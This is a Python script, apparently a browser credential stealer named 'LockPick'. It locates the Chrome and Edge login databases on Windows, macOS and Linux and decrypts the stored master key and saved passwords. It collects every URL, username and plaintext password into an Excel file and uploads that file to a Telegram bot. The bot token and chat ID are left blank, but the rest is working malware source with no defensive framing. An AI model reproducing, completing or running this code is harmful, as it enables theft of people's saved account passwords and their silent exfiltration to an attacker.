import os
import json
import base64
import sqlite3
import shutil
import platform
import win32crypt
import tempfile
import requests
import pandas as pd
from Cryptodome.Cipher import AES

class LockPick:
    def __init__(self):
        self.chrome_secret_key, self.chrome_login_db = self.get_browser_paths('Chrome')
        self.edge_secret_key, self.edge_login_db = self.get_browser_paths('Edge')

    def get_browser_paths(self, browser):
        """Get the secret key and path to the Login Data file based on the browser type."""
        system = platform.system()
        paths = {
            'local_state': None,
            'login_db': None
        }

        if browser == 'Chrome':
            if system == 'Windows':
                paths['local_state'] = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
                paths['login_db'] = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            elif system == 'Darwin':
                paths['local_state'] = os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State')
                paths['login_db'] = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
            elif system == 'Linux':
                paths['local_state'] = os.path.expanduser('~/.config/google-chrome/Local State')
                paths['login_db'] = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
        elif browser == 'Edge':
            if system == 'Windows':
                paths['local_state'] = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
                paths['login_db'] = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
            elif system == 'Darwin':
                paths['local_state'] = os.path.expanduser('~/Library/Application Support/Microsoft Edge/Local State')
                paths['login_db'] = os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/Login Data')
            elif system == 'Linux':
                paths['local_state'] = os.path.expanduser('~/.config/microsoft-edge/Local State')
                paths['login_db'] = os.path.expanduser('~/.config/microsoft-edge/Default/Login Data')

        secret_key = self.extract_secret_key(paths['local_state']) if paths['local_state'] else None
        return secret_key, paths['login_db']

    def extract_secret_key(self, local_state_path):
        """Extract and decrypt the secret key from the browser's Local State."""
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
                if encrypted_key:
                    encrypted_key = base64.b64decode(encrypted_key.encode('utf-8'))[5:]
                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    @staticmethod
    def decrypt_password(ciphertext, secret_key):
        """Decrypt the encrypted password using the secret key."""
        try:
            iv = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_password).decode()
        except Exception:
            return ""

    @staticmethod
    def send_csv_to_telegram(file_path):
        """Send the generated CSV file to a Telegram bot."""
        bot_token = ''
        chat_id = ''
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

        try:
            with open(file_path, 'rb') as file:
                response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
                return response.status_code == 200
        except Exception:
            return False

    def decrypt_passwords(self, browser_name, secret_key, login_db):
        """Decrypt passwords for a specific browser and return them as a DataFrame."""
        passwords = []
        if secret_key and login_db:
            temp_login_db = os.path.join(tempfile.gettempdir(), f"{browser_name.lower()}_passwords.db")
            shutil.copy2(login_db, temp_login_db)

            with sqlite3.connect(temp_login_db) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()

            for url, username, ciphertext in rows:
                if url and username and ciphertext:
                    decrypted_password = self.decrypt_password(ciphertext, secret_key)
                    passwords.append({"URL": url, "Username": username, "Password": decrypted_password})

        return passwords

    def save_to_excel(self, chrome_passwords, edge_passwords):
        """Save passwords to an Excel file with separate sheets."""
        output_file_path = os.path.join(tempfile.gettempdir(), 'decrypted_passwords.xlsx')
        with pd.ExcelWriter(output_file_path) as writer:
            if chrome_passwords:
                chrome_df = pd.DataFrame(chrome_passwords)
                chrome_df.to_excel(writer, sheet_name='Chrome', index=False)
            if edge_passwords:
                edge_df = pd.DataFrame(edge_passwords)
                edge_df.to_excel(writer, sheet_name='Edge', index=False)

        self.send_csv_to_telegram(output_file_path)

    def decrypt_chrome_passwords(self):
        """Decrypt Chrome passwords."""
        return self.decrypt_passwords("Chrome", self.chrome_secret_key, self.chrome_login_db)

    def decrypt_edge_passwords(self):
        """Decrypt Edge passwords."""
        return self.decrypt_passwords("Edge", self.edge_secret_key, self.edge_login_db)

if __name__ == '__main__':
    LockPick = LockPick()
    chrome_passwords = LockPick.decrypt_chrome_passwords()
    edge_passwords = LockPick.decrypt_edge_passwords()
    LockPick.save_to_excel(chrome_passwords, edge_passwords)
